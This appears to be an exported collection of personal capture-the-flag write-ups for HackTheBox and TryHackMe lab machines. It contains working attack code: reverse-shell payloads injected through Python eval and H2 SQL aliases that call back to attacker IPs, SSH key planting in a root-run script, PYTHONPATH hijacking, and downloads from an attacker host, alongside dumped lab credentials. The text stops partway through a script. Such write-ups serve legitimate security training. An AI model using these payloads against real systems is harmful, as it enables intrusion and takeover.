Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)\n|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)\n|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)\n80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: 403 Forbidden\n443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Mango | Search Base\n| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN\n| Not valid before: 2019-09-27T14:21:19\n|_Not valid after:  2020-09-26T14:21:19\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\n### Changing hosts file\n\nBy looking at the source code we can see gogs and api subdomains\n\n\nSo I just modified the  /etc/hosts to the following in order to access them.\n```\n10.10.10.110    craft.htb gogs.craft.htb api.craft.htb\n```\n\n### Gogs page\n![](https://i.imgur.com/wDN37yi.png)\n\n\nBy a simple Google search we find out that [Gogs](https://gogs.io/) is a somewhat widely used git service.\n\nExploring the Craft repo we quickly find that there was an issue and a \"fix\" was implemented:\n![](https://i.imgur.com/eAIzGds.png)\n\nBy simply looking at the code we can easily identify where the vulnerability is. That is, passing user defined input directly into the eval function. \n\nWe can also see that an API is used in the test file, so let's take a look at it as well.\n\n### API page\nWe are presented with this once the page loads:\n![](https://i.imgur.com/4cdaJZf.png)\n\nSo as you can see we can login ( therefore getting a token ), check the validity of the token and delete,update,create,get brews. However we can't interact with it since we don't have any credentials in order to get a token...\n\nBut wait, let's take a closer look at those 2 commits from before. \n\n![](https://i.imgur.com/LjZ4X8U.png)\n\nOH, there you go, credentials found in the source code. Very bad practice indeed :))\n\n## Exploiting eval\nNow that we have the credentials needed to get a token, we need to think of a way to exploit the eval function. Wel... that's easy we just need to do this:\n\n```python\nimport requests\nimport json\nimport urllib3\n\nurllib3.disable_warnings()\n\nurl = \"https://api.craft.htb/api/\"\ns = requests.Session()\nr = s.get(url + \"auth/login\", auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)\ntoken = json.loads(r.text)['token']\nprint(token)\n\ndata = {\n    \"abv\"       : \"__import__('os').system('bash -i \u003e\u0026 /dev/tcp/10.10.15.136/7070 0\u003e\u00261')#\",\n    \"name\"      : \"test\",\n    \"brewer\"    : \"test\",\n    \"style\"     : \"test\"\n}\ndata = json.dumps(data)\n\nheaders = {\n    'X-Craft-API-Token': token,\n    'Content-Type': 'application/json'\n}\nr = s.post(url + \"brew/\", headers=headers, data=data)\nprint(r.text)\n```\n\nAnd start our listener:\n\n```bash\nnc -nvlp 7070\n```\n\nExecute it and... Nothing. But it sohuld work right?\n\nWell that's what I thought in the first place as well, but after a lot of thinking, poking and coffe I found out that I was pretty restricted, so I said fuck it. And build the payload from scratch with the things I knew would work. \n\nFinally I've ended up with this:\n```python\neval(compile(\"\"\"for x in range(1):\\n import socket,subprocess, os\\n s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\n s.connect((\"10.10.15.200\", 7070))\\n os.dup2(s.fileno(),0)\\n os.dup2(s.fileno(),1)\\n os.dup2(s.fileno(),2)\\n import pty\\n pty.spawn(\"/bin/sh\")\"\"\",\"\",\"single\"))\n```\n\nAfter running the same script again, but with this payload I've got a shell.  Hooray!!\n\n## Escaping the jail\nI run `whoami` and I'm root. Uhmmm.... That's pretty strange, but ok let's take the root.txt\n```bash\ncat: /root/root.txt: No such file or directory\n```\n\nAt this point I was confused, I thought that I gained access to a box that I wasn't supposed to, but that couldn't happen. Thus, I took a deeper look and found out that I was in a jail. However, I was having access to a file that I was previously interested in, but couldn't find it in the gogs page. That file being *`settings.py`*\n\nSo I just saw it in the directory I was currently in and took a look at it:\n\n```python\n# Flask settings\nFLASK_SERVER_NAME = 'api.craft.htb'\nFLASK_DEBUG = False  # Do not use debug mode in production\n\n# Flask-Restplus settings\nRESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'\nRESTPLUS_VALIDATE = True\nRESTPLUS_MASK_SWAGGER = False\nRESTPLUS_ERROR_404_HELP = False\nCRAFT_API_SECRET = 'hz66OCkDtv8G6D'\n\n# database\nMYSQL_DATABASE_USER = 'craft'\nMYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'\nMYSQL_DATABASE_DB = 'craft'\nMYSQL_DATABASE_HOST = 'db'\nSQLALCHEMY_TRACK_MODIFICATIONS = False\n```\n\nAnother credentials, ok... but what can we do with them? Well, he is using them to connect to the db so let's do the same:\n```python\n#!/usr/bin/env python\n\nimport pymysql\nfrom craft_api import settings\n\n# test connection to mysql database\n\nconnection = pymysql.connect(host='db',\n                             user='craft',\n                             password='qLGockJ6G2J75O',\n                             db='craft',\n                             cursorclass=pymysql.cursors.DictCursor)\n\ntry:\n    with connection.cursor() as cursor:\n        sql = \"select * from users\"\n        cursor.execute(sql)\n        result = cursor.fetchall()\n        for i in range(len(result)):\n            print(result[i])\n\nfinally:\n    connection.close()\n```\n\nAnd we get:\n\n```\n{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}\n{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}\n{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}\n```\n\nNice we've now got the credentials for every user.\nNow what?\n\nAt this point I thought to SSH with the found credentials, but it didn't work. So after getting into some really deep rabbit holes I've decided to try to connect to the Gogs page with the new secrets as a last hope.\n\nAnd I've got in with the `gilfoyle` user, prompted with this:\n![](https://i.imgur.com/Zwo1dtQ.png)\n\n\u003e **Note**: Don't overcomplicate things, work with what you have and exhaust every possibility before moving on\n\nI've instantly looked at the `.ssh` folder and found the private key and therefore got user. \n\n## Getting root\n\nOnce I've got user I immediatly went back to the new repo to have a deeper look into it, since I learned my lesson from the previous incident.\n\nAfter looking through almost everything, the `vault/secrets.sh` popped as the most interesting to have a look at:\n```bash\n#!/bin/bash\n# set up vault secrets backend\nvault secrets enable ssh\n\nvault write ssh/roles/root_otp \\\n        key_type=otp \\\n        default_user=root \\\n        cidr_list=0.0.0.0/0\n```\n\nWith the help from Google I've found [this](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html). I've just followed the article:\n\n```bash\nvault write ssh/creds/otp_key_role ip=10.10.10.110\n```\n\nGot the otp and used it to connect through SSH, since root was allowed to login.\n\n\n## See Also\n- [[write-ups/HTB]]\n","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/write-ups/htb/obscurity":{"title":"Obscurity","content":"\n![](https://i.imgur.com/OcukgEq.png)\n\n## Enumeration\n\nI started with a simple nmap to get a basic overview:\n```bash\nnmap -sC -sV -oA nmap/obscurity 10.10.10.168\n```\n\n![](https://i.imgur.com/UtwqgOP.png)\n\nAs you can see ports `8080` (**http**), `22`(**ssh**) and `9000` are open.\n\n## Website\n\nOnce on the web page we are prompted with this:\n\n![](https://i.imgur.com/DyVcVsf.png)\n\nIf you scroll a little bit more we find something peculiar:\n\n![](https://i.imgur.com/nx5y6OA.png)\n\nSo we need to find the `SuperSecureServer.py` file in order to get the backend code of this web app. For that I used [ffuf](https://github.com/ffuf/ffuf):\n\n![](https://i.imgur.com/SZfkC5u.png)\n\nAfter letting `ffuf` to do it's job for a while, we are prompted with the desired folder: `develop`. So, the directory was not so secret afterall because we can access the file at `/develop/SuperSecureServer.py`:\n\n![](https://i.imgur.com/2PDFkRP.png)\n\nWell, now it's time to look for a **RCE** or something that we can exploit. This task is not so complicated since the following line looks like this:\n\n![](https://i.imgur.com/vhBYHsX.png)\n\nSo we can execute code if we format correctly the `path` variable. Therefore, I came up with this little python script:\n\n![](https://i.imgur.com/Mxg9BRw.png)\n\nWhen the server processes the request, the `info` variable will look like this:\n\n```\noutput = 'Document'\n\u003creverse_shell\u003e\nape=''\n```\n\nThis is valid python code. As a result, we get back a shell:\n\n![](https://i.imgur.com/QootNLC.png)\n\n---\n\n## User\n\nIf we take a look at the folder where the user flag is we find these interesting files:\n![](https://i.imgur.com/ECmODcN.png)\n\nWe have just 4 files we care about:\n1. `SuperSecureCrypt.py` - Python script to encrypt files\n2. `check.txt` - Clear text of `out.txt`\n3. `out.txt` - Ciphertext of clear text `check.txt`\n4. `passwordreminder.txt` - Encrypted password of the robert user\n\nBy taking a look at how the encryption/decryption algorithm works, we find a funny thing. That is, we can obtain the password used in an encrypted text if we know the clear text:\n\n![](https://i.imgur.com/M03zheF.png)\n\nThus, in order to find the password used to encrypt the `out.txt` file we just need to execute the following:\n\n![](https://i.imgur.com/rajzLAI.png)\n\nThe password used to encrypt the text was: **alexandrovich**\n\nNow that we know the password, we can decrypt the `passwordreminder.txt`\n\n```bash\npython3 SuperSecretCrypt.py -k \"alexandrovich\" -i passwordreminder.txt -o /tmp/pass -d\n```\n\nThe password for robert being **SecThruObsFTW**. Login with *SSH* and cat `user.txt`\n![](https://i.imgur.com/hvTjk0v.png)\n\n---\n\n## Root\n\nNow that we have access to the robert user, we can look at a file we ommited on our journey of getting the user flag. That file is `BetterSSH.py`\n\n![](https://i.imgur.com/wsIffJq.png)\n\nThe first part of the script is just authenticating the user we provide with the password. What is more interesting is the second part:\n\n![](https://i.imgur.com/DmMQfyp.png)\n\nThe 4th line is of interest because it executes commands with `sudo -u` and our input, so we can do something like: `sudo -u robert -u root whoami`, which in theory should display **root**.\n\nFirst I tried to execute the script with sudo:\n\n![](https://i.imgur.com/Grny92t.png)\n\nOk.. so we are not allowed to run the script. At this point I decided to run [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), which gave me this:\n\n![](https://i.imgur.com/rHySzW3.png)\n\nNow it all makes sense we need to execute:\n```bash\nsudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py\n```\n\nAnd then input `-u root cat /root/root.txt`\n\n![](https://i.imgur.com/kizLVnn.png)\n\n## See Also\n- [[write-ups/HTB]]","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/write-ups/htb/time":{"title":"Time","content":"\n## Overview\n\nThis box is a Linux one. For the initial foothold you need to exploit a bug within the Jackson library for deserializing **JSON's** leading to a SSRF which can leverage a RCE. Once on the box a simple classic enumeration reveals a root bash script with read/write access. Consequenlty, just importing your pub **SSH** key into the `authorized_keys` file will grant access to root.\n\n\n## Enumeration\n\nRunning nmap reveals 2 services:\n\n```bash\n\u003e nmap -sC -sV -oA nmap/time 10.10.10.214\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Online JSON parser\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\nOnce we check the web server, we see that we can beutify/validate JSON. Also, the validate functionality is in Beta. So let's check that first.\n\u003cbr\u003e\n\nUpon submitting `{\"test\"}` we see the following error: \n```\nValidation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object\n```\n\nSo it's expecting an array: `[\"test\"]`. \nBut that also throws an error: \n```\nValidation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'test' as a subtype of [simple type, class java.lang.Object]: no such class found\n```\n\nNow, in both of our errors we see that they're thrown by a library called *jackson*, which is used to \nserialize or map POJO *(Plain Old Java Objects)* to JSON and deserialize JSON to POJO. With some more searching we find a [CVE](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html) which addresses a deserialization vulnerability where an attacker could control the class to be deserialized.\n\n\n## Understanding the CVE\n\n### What is serialization/deserialization\nIn order to understand what deserialization vulnerabilities are and behave, we firstly need to get familiar with what serialization \u0026 deserialization is. Swapneil Kumar Dash wrote a beautiful [article](https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d) about this, however I will provide a short overview in this post as well. \n\n\u003e In computing, serialization  is the process of translating a data structure or object state into a format that can be stored or transmitted and reconstructed later. Deserialization is the opposite.\n\nIn our case, we translate java objects into JSON and vice-versa.\n\n#### What could go wrong ?\n\nUsually, in java we can use something like this to deserialize data:\n```java\n...\nFileInputStream fin  = new FileInputStream(\"your/file/path\");\nObjectInputStream in = new ObjectInputStream(fin);\ncustomClassInstance  = (CustomClass) in.readObject();\n...\n```\nThe main problem lies within the way readObject deserializes data which executes the class while also\nthrowing an error if we give it a serialized input of a different class.\n\nI won't go into much detail here on this topic, since it's a broad one. However, if you're interested in \nlearning more about it you should check the resources and [this talk](https://www.youtube.com/watch?v=t-zVC-CxYjw) by **Alexei Kojenov** which also made some great [examples](https://github.com/kojenov/serial) you can play \naround with.\n\n### How java gadgets work\nGadgets are just a class or funcion that's available within the executing scope of an application. For example the following code is a simple implementation in Java:\n```java\n/* CacheManager.java */\npublic class CacheManager implements Serializable {\n\tprivate final Runnable initHook;\n\tpublic void readObject(ObjectInputStream in) {\n\t\tin.defaultReadObject();\n\n\t\tinitHook.run();\n\t}\n}\n\n/* CommandTask.java */\npublic class CommandTask implements Runable, Serializable {\n\tprivate final String cmd;\n\tpublic CommandTask(String cmd) {\n\t\tthis.cmd = cmd;\n\t}\n\n\tpublic void run() {\n\t\tRuntime.getRuntime().exec(cmd);\n\t}\n}\n```\n\nHere, an attacker can inject a serialized `CommandTask` into an input stream that will be read by `CacheManager`, which in return invokes run. Therefore, he gains arbitrary command execution.\n\u003cbr\u003e\n\n### Jackson library deserialization vulnerability POC\nThe *CVE* of interest is focusing mostly on the *Jackson* library. They found that when *Jackson* deserializes a specific class (`ch.qos.logback.core.db.DriverManagerConnectionSource`), it can be abused to instantiate a Java Database Connectivity *(JDBC)*, which is used to connect \u0026 interact with the dabase. To understand better let's break down the payload used in the [**POC**](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html):\n\n`$ \"[\\\"ch.qos.logback.core.db.DriverManagerConnectionSource\\\", {\\\"url\\\":\\\"jdbc:h2:mem:\\\"}]\"`\n\nAs said previously we use the `DriverManagerConnectionSource` class to pass an url, which will trigger [`setUrl`](https://www.javadoc.io/doc/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#setUrl(java.lang.String)). Afterwards, the object is serialized into a JSON object again. Consequently, the `getConnection()` [method](https://www.javadoc.io/static/ch.qos.logback/logback-core/1.1.11/ch/qos/logback/core/db/DriverManagerConnectionSource.html#getConnection()) is called which creates an in-memory database. This is further used to create a remote connection.\n\u003cbr\u003e\n\nUntil now, we've only got a way to generate a Server Side Request Forgery *(SSRF)*. So how could we turn this into a full chain RCE ?\nIn order to achieve that, the guys from [doyensec](https://doyensec.com/) leveraged the [H2](http://www.h2database.com/html/features.html) JDBC driver which has the capability to run SQL scripts from the JDBC url. This alone won't allow an attacker to run Java code inside the JVM context, however H2 has the capability to specify custom aliases containing java code [which can be abused](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html).\n\n```sql\nCREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {\n\tjava.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream())\n\t\t.useDelimiter(\"\\\\A\");\n\treturn s.hasNext() ? s.next() : \"\";\n}$$;\nCALL SHELLEXEC('whoami')\n```\n\nAs a result, we only need to serve a sql file to the target machine that makes the request to our in-memory *DB* with the use of `DriverManagerConnectionSource` and we have remote code execution.\n\n\n## Leveraging what we've learned to own user\n\nWe've learned that we can use a deserialization vulnerability within Jackson to leverage a connection to a in-memory *DB*, which accepts aliases that can be used to execute commands. So, all wee need to do is:\n\n1. *Prepare the `inject.sql` script*\n```java\nCREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {\n\tjava.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream())\n\t\t.useDelimiter(\"\\\\A\");\n\treturn s.hasNext() ? s.next() : \"\";\n}$$;\nCALL SHELLEXEC('bash -i \u003e\u0026 /dev/tcp/IP/PORT 0\u003e\u00261')\n```\n\n2. *Setup http server \u0026 netcat listener*\n![](https://i.imgur.com/kYaG0vZ.png)\n\n\n3. *Abuse the deserialization vulnerability \u0026 use the `DriverManagerConnectionSource` gadget*\n\n4. *Enjoy your shell*\n![](https://i.imgur.com/jh0fwLP.png)\n\n\n\n## Privilige escalation\n\nOnce on the box, a simple enumeration reveals that we have write access to a backup script ran by root.\n```bash\nbash-5.0$ cat /usr/bin/timer_backup.sh\ncat /usr/bin/timer_backup.sh\n#!/bin/bash\nzip -r website.bak.zip /var/www/html \u0026\u0026 mv website.bak.zip /root/backup.zip\n```\n\nSo, we could just import our public SSH key and have root access.\n```bash\necho \"echo SSH_PUB_KEY \u003e\u003e /root/.ssh/authorized_keys\" \u003e\u003e /usr/bin/timer_backup.sh\n```\n\n\n## Conclusion\nI've seen that a lot of people said that this box is easy, which I can agree in the way that you can find the CVE quite easy and modify the POC payload to get the flags and move on, without diving more into it. However, I think that this is a great box for someone new and even for some more experienced people. I say this because if you really want to understand what's going on behind the scenes, which you should, you understand new concepts such as: *java deserialization, gadgets, how an actual CVE is found, etc*.\n\nHonestly, I learned a lot by playing around with this box and afterall this is the goal of *HTB*. To learn new concepts that you can add to your skill-set which elevates your craft.\n\nIf you want to dig deeper into deserealization attacks within java libraries, I suggest you check the references down below. I found some really great articles/talks about this subject which I can't give enough credit.\n\n## References\n- [Understanding Java Deserialization](https://medium.com/@swapneildash/understanding-java-de-serialization-ee96054da15d)\n- [Java deserealization lib to secure apps](https://github.com/ikkisoft/SerialKiller)\n- [Understanding insecure implementation of Jackson deserialization](https://medium.com/@swapneildash/understanding-insecure-implementation-of-jackson-deserialization-7b3d409d2038)\n- [On Jackson CVEs: Don‚Äôt Panic ‚Äî Here is what you need to know](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)\n- [SnakeYaml Deserilization exploited](https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858)\n- [POC tool 4 generating payloads that exploit unsage Java object deserilization](https://github.com/frohoff/ysoserial)\n- [Depickling, gadgets and chains: The class of exploit that unraveled Equifax](https://brandur.org/fragments/gadgets-and-chains)\n- [POC Jackson deserilization on Spring web app](https://github.com/galimba/Jackson-deserialization-PoC)\n- [Java deserilization cheat-sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#jackson-json)\n- [Jackson Library](https://github.com/FasterXML/jackson)\n- [Marshalling Pickles - OWASP AppSec California 2015](https://www.youtube.com/watch?v=KSA7vUkXGSg)\n- [CVE-2019-12384](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)\n\n## See Also\n- [[write-ups/HTB]]","lastmodified":"2022-09-07T18:56:28.935585303Z","tags":null},"/write-ups/thm/Biblioteca":{"title":"Biblioteca","content":"\n## Recon\n\n![[Pasted image 20220602213700.png]]\n\nGoing to the http server gets us this:\n![[Pasted image 20220813102932.png]]\nThought about brute-forcing the login form, but since the box has this message: `\"Shhh. Be very very quiet, no shouting inside the biblioteca.\"`, they probably don't want us to do that üòá\n\nWe see that the back-end of the web-app is running [Werkzeug](https://werkzeug.palletsprojects.com/en/2.2.x/), a comprehensive¬†[WSGI](https://wsgi.readthedocs.io/en/latest/)¬†web application library. At this poing I started to search the internet for any known vulnerabilities, but I just found an [RCE through the debug console](https://www.rapid7.com/db/modules/exploit/multi/http/werkzeug_debug_rce/) \u0026 a bypass for the `/console` endpoint if protected by a pin. But we have no debugging enabled so, no luck I guess.\n\n## Init Access\nProceeding forward, I tried basic sqli on the login form \u0026 it worked\n\n![[Pasted image 20220813103043.png]]\n\nHmm, we're logged in as `smokey`, that might be one of the users.  I also noticed that once logged in, we're assigned this cookie:\n\n![[Pasted image 20220813103317.png]]\n\nTried to modify it in order to enumerate users or change my privileges, but that was a dead-end. So let's just do the obvious \u0026 leverage our sqli. Maybe we can leak some password hashes \u0026 crack em.\n```bash\nsqlmap -u http://10.10.50.239:8000/login --data \"username=a\u0026password=b\" --method POST -D website --dump\n```\n\n![[Pasted image 20220813103535.png]]\n\nWell, seems like we don't need to crack anything @ all üôÉ\n\n## Users are dumb\nI then used these credentials to `ssh` onto the system \u0026 enumerate some more\n\n![[Pasted image 20220813103818.png]]\n\n[logratate is exploitable](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation) apparently, but not is not a SUID in this case. Moving on, I looked for users on the box. Once I found another user `hazel`, I knew that I needed to first pivot to him \u0026 then try to gain root\n\n![[Pasted image 20220813103909.png]]\n\nOn a glimpse of hope, I found this in the source code of the web-app:\n```python\n# /var/opt/app/app.py\napp.secret_key = '$uperS3cr3tK3y'\n\napp.config['MYSQL_HOST'] = 'localhost'\napp.config['MYSQL_USER'] = 'smokey'\napp.config['MYSQL_PASSWORD'] = '$tr0nG_P@sS!'\napp.config['MYSQL_DB'] = 'website'\n```\n\nBut none of these passwords worked for `hazel`. Finally, after 1 hour spent in the darkness of the guessing-void, I found out that it was just `hazel:hazel` ü´† , should've known from the hint tho.\n\n\n## Hijacking python libraries to gain root\nSince I knew that this is not going to be a *SUID* privesc from my previous attempt, I let `linpeas` run in the background while I did a simple `sudo -l` hoping for a direct root shell. Instead, I was greeted with this:\n\n![[Pasted image 20220813104645.png]]\n\nOk so we can run `hasher.py` as root, but only with the correct path. So no replacing the script or some `PATH` mambo jambo. The script looks like this:\n![[Pasted image 20220813104919.png]]\n\nSo here's our situation:\n- we can launch the `hasher.py` script using `sudo` *(provided with the right path)*\n- the python script uses an external library *(`hashlib`)*\n- we can't simply inject a payload into the script, since we don't have write privileges\n\nFinding a way to bypass this might seem impossible. Well, it's not let me introduce you to [[PYTHONPATH Hijacking]]. `PYTHONPATH` is an environment variable which you can set to add additional directories where python will look for modules and packages. Thus, by controlling this variable we can create our own version of `hashlib` \u0026 specify its path before executing `hasher.py`. As a result, when python will look to import the module it will load our own \u0026 since we can run as `sudo` we gain `root` privileges üòâ\n\nLet's have a look @ it in action:\n```bash\necho \"import os;os.system('bash')\" \u003e /dev/shm/hashlib.py\nsudo PYTHONPATH=/dev/shm/ python3 ~/hasher.py\n```\n\n\n![[Pasted image 20220813105502.png]]\n\n## Refs\n- https://mikadmin.fr/blog/linux-privilege-escalation-python-library-hijacking/\n- https://book.hacktricks.xyz/linux-hardening/privilege-escalation#setenv\n- https://www.sudo.ws/docs/man/1.8.15/sudoers.man/#SETENV\n\n## See Also\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/Relevant":{"title":"Relevant","content":"\n## Recon\n![[Pasted image 20220823222922.png]]\n\n![[Pasted image 20220823222939.png]]\n\n### Got creds through SMB ü•≥ ... oh wait\nRunning the [smb-enum-shares](https://nmap.org/nsedoc/scripts/smb-enum-shares.html) script with `nmap` revealed the following shares:\n\n![[Pasted image 20220824172805.png]]\n\nThe next thing I did was to check all of them for anonymous login \u0026 we got a hit on `/nt4wrksv`:\n\n![[Pasted image 20220823223327.png]]\n\nSeems like we hit the jackpot. The file contains the credentials for 2 users encoded in base64\n\n![[Pasted image 20220824173140.png]]\n\nNow I tried connecting to RDP with them, but nothing came back. Running `psexec` revealed that `bill` doesn't even exist \u0026 that the password we got for `bob` is outdated... \n\n![[Pasted image 20220823225348.png]]\n\nNow, I really thought I needed to do something with those credentials, but there wasn't much I haven't tested. I guess sometimes you just have to accept the situation \u0026 let go, instead of persisting on a path that doesn't lead anywhere.\n\n### Strange Ports *(49663, 49667, 49669)*\nThe only ports I didn't tinker with @ this point were the `4966*` one's, let's have a look\n\n![[Pasted image 20220824173816.png]]\n\nFrom all of them, `49663` is looking spicy. Looking at the web-server seems that it's the same as the one running on `80` *(that is the default [microsoft web server](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh831725(v=ws.11)) page)*. Being quite stuck, I ran `dirsearch` on both of them looking for differences\n\n![[Pasted image 20220824191103.png]]\n\n## Inital Access\nAs you can see the server on `49663` has a route that's named exactly after our smb share earlier. With that in mind, I wanted to see if what I upload on the `nt4wrksv` share is reflected on the web-server\n\n![[Pasted image 20220823230935.png]]\n\nAaand it is indeed üòç. OK, finally we have something we can work with. The next step was to generate a payload with `msfvenom`, upload it with `smbclient`, start up a listener \u0026 navigate to `http://10.10.111.160:49663/nt4wrksv/pwn.exe`\n\n![[Pasted image 20220824183824.png]]\n\n## Privesc with [[sheets/Token Impersonation|Token Impersonation]]\nOnce on the box I wanted to see what privileges I had:\n\n![[Pasted image 20220824185227.png]]\n\nWe see that `SeImpersonatePrivilege` is enabled which can be abused to let us run commands as system *(check out [[Token Impersonation.md#Tokens]] for more info on this technique)*. Since I've done this before with metasploit in [Alfred](Alfred.md), this time I'll use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). Get the executable, upload it as before with `smbclient` \u0026 execute:\n\n![[Pasted image 20220824190740.png]]\n\n\n## Refs\n- [Abusing Impersonation Privileges on Windows 10 and Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)\n\n## See Also\n- [[sheets/Token Impersonation]]\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/Steel-Mountain":{"title":"Steel Mountain","content":"\n## Recon\n![[Pasted image 20220821035650.png]]\n- on `80` we're greeted with this =\u003e we can answer *\"who's the employee of the month\"*\n\t- ![[Pasted image 20220821035600.png]]\n- on `8080` we have a file server, but with nothing in it. Couldn't get anywhere by trying to login\n\t- ![[Pasted image 20220821035833.png]]\n- tried doing some enumeraation on smb as well with `enum4linux` but nothing came out\n- however, looking back at the `httpd` version, which seems quite outdated, running on `8080` reveals [this exploit](https://www.exploit-db.com/exploits/39161)\n \n## Init Access\nSo we know we have a vulnerable endpoint to RCE due to a poor regex in the file `ParserLib.pas`. It achieves this by leveraging the HFS scripting commands by using `'%00'` to bypass the filtering. We could use the metasploit module `exploit/windows/http/rejetto_hfs_exec`, but since we already got the python script let's just try that. \n\nIt's specifying that we need to serve [nc.exe](https://github.com/int0x33/nc.exe/), so I spun up a python http server: `python -m http.server 80`, change the ip \u0026 port inside the script and just ran it:\n\n![[Pasted image 20220821041339.png]]\n\n## Privesc w Unquoted Service Path\nThey insist on enumerating the machine using [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) so I did that, but also ran [winPeas](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat).\n```bash\npowershell -Command Invoke-WebRequest -Uri http://10.18.12.227/PowerUp.ps1 -OutFile pup.ps1\npowershell -Command Invoke-WebRequest -Uri http://10.18.12.227/winPeas.bat -OutFile wpes.bat\n```\n\n```batch\nwmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n```\n\nBoth detect the usage of [[Unqoted Service Paths]] which can lead to privilege escalation by replacing the legitimate service with our own. Also note the `CanRestart: true` option. This will trigger our infected program \u0026 will get us a system shell\n\n![[Pasted image 20220821044432.png]]\n\nFirst we gotta generate the malicious service \u0026 upload to target *([Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2))*\n\n![[Pasted image 20220821044954.png]]\n\n From here we need to determine where do we put this. We know that our service is in `C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\` =\u003e anywhere before it should work. Since in `Program Files (x86)` we don't have write access, the most convenient option is in `IObit`. Then we setup our listener \u0026 restart the service\n \n ![[Pasted image 20220821051303.png]]\n\n![[Pasted image 20220821051411.png]]\n\n\n## Refs\n- [Windows Privilege Escalation - Unquoted Service Path](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)\n\n## See Also\n- [[sheets/Unqoted Service Paths]]\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.171584296Z","tags":null},"/write-ups/thm/agent-t":{"title":"Agent T","content":"\n\n![[write-ups/images/Pasted image 20220807180318.png]]\n\nSo let's check the web server:\n\nAt this point I let `gobuster` run in the background, while I fired-up burp \u0026 started browsing around the website:\n![[write-ups/images/Pasted image 20220807180601.png]]\n\nNothing too interesting. Besides this conversation\n![[write-ups/images/Pasted image 20220807182331.png]]\n\nAfter, poaching it for a little \u0026 hit some dead-ends, I went back to `nmap` \u0026 started [searching](https://letmegooglethat.com/?q=PHP+8.1.0-dev) for the php versions listed: `PHP cli server 5.5 or later (PHP 8.1.0-dev)`. I stumbled upon a [User-Agent RCE backdoor](https://github.com/flast101/php-8.1.0-dev-backdoor-rce). So we can just execute commands on the web server by suplying cmds through the `User-Agentt` header ! \n*([here](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a) is the commit that implements the backdoor, which was quickly [reverted](https://github.com/php/php-src/commit/8d743d5281c29e9750e183804b7ba02e1ff82f0b). Following to change the whole [commit workflow](https://news-web.php.net/php.internals/113838) of php's development)*\n\n- craft a little python script to spawn a reverse shell for us\n\t```python\n\timport requests\n\t\n\t# Change ME\n\ttarget = \"10.10.98.243\"\n\tlhost  = 